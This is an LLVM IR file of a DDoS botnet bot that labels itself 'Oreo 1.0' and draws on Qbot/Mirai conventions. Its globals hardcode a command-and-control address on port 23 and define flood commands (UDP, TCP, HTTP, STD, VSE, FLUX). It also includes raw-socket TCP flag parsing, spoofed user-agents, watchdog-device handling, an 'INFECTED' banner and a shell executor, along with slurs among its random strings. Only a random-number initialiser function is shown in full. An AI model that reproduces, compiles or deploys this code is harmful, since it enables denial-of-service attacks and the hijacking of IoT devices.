; ModuleID = 'host/ir_O3/Oreo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@OreoServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"128.199.197.79:23\00", align 1
@ioctl_pid = local_unnamed_addr global i32 0, align 4
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@rangechoice = local_unnamed_addr global i32 1, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@useragents = local_unnamed_addr global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.73, i32 0, i32 0)], align 16
@.str.42 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.44 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.45 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.47 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.48 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.49 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.51 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.52 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.53 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.54 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.58 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.59 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.60 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.61 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.62 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.63 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.64 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.65 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.66 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.67 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.68 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.69 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.70 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.71 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.72 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.73 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@scanPid = common local_unnamed_addr global i32 0, align 4
@ourPublicIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.117 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.4 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.41, i32 0, i32 0)], align 16
@.str.6 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.14 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
@.str.19 = private unnamed_addr constant [11 x i8] c"0nnf0l20im\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"uq7ajzgm0a\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"loic\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"ParasJhaIsADumbFag\00", align 1
@.str.23 = private unnamed_addr constant [17 x i8] c"stdudpbasedflood\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"bitcoin1\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"password\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"encrypted\00", align 1
@.str.27 = private unnamed_addr constant [11 x i8] c"suckmydick\00", align 1
@.str.28 = private unnamed_addr constant [13 x i8] c"guardiacivil\00", align 1
@.str.29 = private unnamed_addr constant [13 x i8] c"2xoJTsbXunuj\00", align 1
@.str.30 = private unnamed_addr constant [13 x i8] c"QiMH8CGJyOj9\00", align 1
@.str.31 = private unnamed_addr constant [9 x i8] c"abcd1234\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"GLEQWXHAJPWM\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"ABCDEFGHI\00", align 1
@.str.34 = private unnamed_addr constant [10 x i8] c"abcdefghi\00", align 1
@.str.35 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.36 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.39 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"nexuszetaisamaddict\00", align 1
@.str.41 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0)], align 16
@.str.80 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.81 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.82 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.83 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.84 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.75 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.85 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.86 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.88 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.92 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.93 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.94 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.96 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.99 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.100 = private unnamed_addr constant [23 x i8] c"/dev/FTWDT101_watchdog\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.103 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.104 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"FLUX\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"VSE\00", align 1
@.str.108 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.110 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.112 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.113 = private unnamed_addr constant [85 x i8] c"\1B[0;31m\1B[43mINFECTED\1B[40m\1B[0m \1B[0;31m----\1B[0;33m>    \1B[0;31m[\1B[0;33m%s\1B[0;31m]  \1B[0m\00", align 1
@.str.114 = private unnamed_addr constant [9 x i8] c"Oreo 1.0\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.116 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

